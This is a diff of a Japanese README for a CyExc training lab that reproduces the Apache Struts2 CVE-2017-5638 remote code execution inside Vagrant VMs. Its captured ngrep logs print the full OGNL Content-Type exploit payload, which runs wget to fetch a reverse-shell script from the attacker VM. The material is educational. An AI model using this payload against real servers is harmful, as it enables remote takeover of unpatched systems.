@@ -1,11 +1,9 @@
 # Struts2脆弱性を利用した演習について
 ## Motivation
-「すべてわかるセキュリティ大全 2018（日経コンピュータ、日経BP社）」で、情報処理推進機構（IPA）やJPCERT コーディネーションセンター（JPCERT/CC）が注意喚起を行った後も、Struts2脆弱性による情報流出事故が後を絶たなかったことを記事にしている。CVE-2017-5638はRemote Code Execution (RCE)」と言われる脆弱性のタイプで、Struts2脆弱性を利用し任意のコードを第三者が実行できる。また、攻撃コードが公開されており、企業などでは早急に対策を実施することが求められていた。
-
-こうした背景で、Struts2脆弱性を利用した攻撃事象を再現し、WEB脆弱性の脅威に対する理解を促がすことは非常に重要である。  
+Apache Struts2の脆弱性を持ったウェブサーバに対しての攻撃やこれに起因する情報漏洩事故は、情報処理推進機構（IPA）やJPCERT コーディネーションセンター（JPCERT/CC）による注意喚起が行われた後も長期的に継続して発生している。この脆弱性「CVE-2017-5638」は、脆弱性を利用し任意のコードを第三者が実行できる、Remote Code Execution (RCE) と呼ばれるものである。ウェブの脆弱性やそれに対しての攻撃手法についての理解を深めることを目的として、重大かつ広範囲に多大な影響が合ったApache Struts2の脆弱性を題材に再現する演習を行う。
 
 ## 学習目標
-CyExcが提供する本演習では、学習者に対してのStruts2脆弱性の脅威を理解することを目的とし、Reverse Shellスクリプトを使用し、CVE-2017-5638の攻撃を再現する。VagrantにTarget(Struts2サーバ)とAttacker(WEBサーバ)の2つのゲストOSを構築した環境を提供する。Reverse Shellスクリプトは倫理の観点から、ここでの公開はしないこととする。
+CyExcが提供する本演習では、ウェブサーバの脆弱性やそれに対しての攻撃手法や脅威の理解を目的とし、Reverse Shellスクリプトを使用してCVE-2017-5638の攻撃を再現する。Vagrantに攻撃対象のサーバ (Target OS、ウェブサーバ、Apache Struts2を利用) と攻撃者が利用するサーバ (Attacker OS、ウェブサーバ) の2つのゲストOSを構築した環境を提供する。なお、Reverse Shellスクリプトは情報倫理の観点から、CyExcでの公開または提供は行わないものとする。
 
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex1/images/block.png" title="Ex1演習環境構成図">
 
@@ -17,7 +15,7 @@ TargetマシンからAttackerマシンに通信を開始するシェルのこと
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex1/images/reverseshell.png" title="ReverseShell">
 
 ## シナリオ
-Attacker OSからTarget OSに設置されたApache Struts2が設置されたサーバにアクセスし、悪意あるリクエストを送信する。また、Reverse Shellスクリプトを実行し、Apache Struts2が設置されたサーバのシェル制御を取得する。
+Attacker OSからTarget OSに設置されたApache Struts2が設置されたサーバにアクセスし、悪意あるリクエストを送信する。次にReverse Shellスクリプトを実行し、Apache Struts2が設置されたTarget OSのサーバのシェル制御を取得する。
 
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex1/images/network.png" title="ネットワーク図">
 
@@ -40,15 +38,15 @@ attacker.cyexc-attacker        192.168.33.20
 $ vagrant ssh target
   i. $ cd target/　　　    
   ii.$ sudo docker-compose up --build
-  iii. Browse to http://target.cyexc-target/struts2-showcase-2.3.12/index.action
+  iii. Browse to ht&#8203;tp://target.cyexc-target/struts2-showcase-2.3.12/index.action
 4. attacker側のOS起動
 $ vagrant ssh attacker
   i. $ cd attacker/　　　    
   ii.$ sudo docker-compose up --build
-  iii. Browse to http://attacker.cyexc-attacker:8081/
+  iii. Browse to ht&#8203;tp://attacker.cyexc-attacker:8081/
 
   <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex1/images/screenshot.png" title="Screenshot">
-  URL=http://target.cyexc-target/struts2-showcase-2.3.12/index.action
+  URL=h&#8203;ttp://target.cyexc-target/struts2-showcase-2.3.12/index.action
 
   CMDはTarget OSで実行したいシェルコマンドを入力する。
   Reverse Shellスクリプトは`wget http://192.168.33.20:8081/reverseShellClient.js`と入力し、Attacker OSからTarget OSにダウンロードした。
@@ -130,7 +128,7 @@ vagrant@webgoat:~/apps$ sudo docker cp 937fb140f393:/ngrep.log .
   T 192.168.33.20:57860 -> 192.168.1.100:80 [AP]
   GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
   User-Agent: Mozilla/5.0.
-  Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#**cmd='wget http&#58;//192.168.33.20:8081/reverseShellClient.js'**).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+  Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#**cmd='wget ht&#8203;tp//192.168.33.20:8081/reverseShellClient.js'**).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
 
 + proxyサーバからApache Struts2に転送  <br>
   T 192.168.1.100:37888 -> 192.168.1.10:8080 [AP]
@@ -141,7 +139,7 @@ vagrant@webgoat:~/apps$ sudo docker cp 937fb140f393:/ngrep.log .
   X-Forwarded-Proto: http.
   X-Real-IP: 192.168.33.20.
   Host: target.cyexc-target.
-  Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#**cmd='wget http&#58;//192.168.33.20:8081/reverseShellClient.js'**).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+  Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#**cmd='wget ht&#8203;tp://192.168.33.20:8081/reverseShellClient.js'**).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
 
 取得したログはこちら＠[ngrep.log](https://github.com/CyExc/CyExc/blob/master/2017/ex1/logs/ngrep.log)
 
